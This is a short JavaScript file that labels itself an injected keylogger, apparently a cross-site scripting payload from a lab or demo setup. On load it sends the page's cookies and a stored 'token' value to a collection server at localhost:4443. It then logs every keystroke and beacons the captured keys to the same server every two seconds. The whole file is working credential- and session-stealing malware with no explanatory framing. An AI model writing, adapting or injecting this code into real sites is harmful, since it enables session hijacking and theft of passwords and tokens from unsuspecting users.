console.log("Injected keylogger");

new Image().src = "http://localhost:4443?a=" + document.cookie + '&aa=' + localStorage.getItem('token');

var keys = "";
var id = Math.random().toString(36).replace("0.", "");

document.onkeydown = function (e) {
  let get = window.event ? event : e;
  let key = get.keyCode ? get.keyCode : get.charCode;
  if (key === 9 || key === 13) {
    keys += " ";
  }
};

document.onkeypress = function (e) {
  let get = window.event ? event : e;
  let key = get.keyCode ? get.keyCode : get.charCode;
  key = String.fromCharCode(key);
  keys += key;
};

window.setInterval(function () {
  if (keys != "") {
    new Image().src = "http://localhost:4443?b=" + keys + '&id=' + id
    keys = "";
  }
}, 2000);
